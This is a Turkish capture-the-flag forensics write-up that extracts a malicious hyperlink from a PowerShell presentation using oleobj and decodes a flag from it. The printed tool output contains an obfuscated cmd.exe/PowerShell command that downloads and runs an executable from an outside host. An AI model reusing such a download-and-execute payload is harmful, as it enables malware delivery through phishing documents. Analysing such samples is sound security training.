### FORENSIC / ALIEN PHISH

<p>Forensic kategorisindeki bu soruda indirilen zip dosyasının içerisinden "Alien Weaknesses.pptx" dosyası çıkmaktadır.</p>

```bashscript
$ unzip forensic_alienphish.zip
Archive:  forensics_alienphish.zip
  inflating: Alien Weaknesses.pptx
```
"[oletools](https://github.com/decalage2/oletools)" ole dosyaları analiz araç kiti içerisinden "oleobj" aracını 
kullanarak pptx dosyası içeriğindeki objeleri çıkartabiliriz.

```bashscript
$ oleobj "Alien Weaknesses.pptx"
oleobj 0.56.1 - http://decalage.info/oletools
THIS IS WORK IN PROGRESS - Check updates regularly!
Please report any issue at https://github.com/decalage2/oletools/issues

-------------------------------------------------------------------------------
File: 'Alien Weaknesses.pptx'
Found relationship 'hyperlink' with external link cmd.exe%20/V:ON/C%22set%20yM=%22o$%20eliftuo-%20
exe.x/neila.htraeyortsed/:ptth%20rwi%20;'exe.99zP_MHMyNGNt9FM391ZOlGSzFDSwtnQUh0Q'%20+%20pmet:vne$
%20=%20o$%22%20c-%20llehsrewop&&for%20/L%20%25X%20in%20(122;-1;0)do%20set%20kCX=!kCX!!yM:~%25X,1!&
&if%20%25X%20leq%200%20call%20%25kCX:*kCX!=%25%22
Found relationship 'hyperlink' with external link cmd.exe
```
Dosya içeriğinden 'hyperlink' ile bağlantılı bir dış link bulunduğu görülmektedir. Elde edilen çıktı ters çevirildiğinde içerisinde bulunan exe uzantılı dosya ismi dikkat çekmektedir.

```bashscript
$ oleobj "Alien Weaknesses.pptx" | awk -F\' '{print $4}'                                  1 ⨯

exe.99zP_MHMyNGNt9FM391ZOlGSzFDSwtnQUh0Q
```
Bu dosya ismi ters çevirildiğinde ve base64 decode edildiğinde bayrak elde edilmektedir.

```bashscript
$ oleobj "Alien Weaknesses.pptx" | awk -F\' '{print $4}' | rev | base64 -di               1 ⨯
CHTB{pH1sHiNg_w0_m4cr0s��^�base64: invalid input
```
#### BAYRAK : __CHTB{pH1sHiNg_w0_m4cr0s???}__
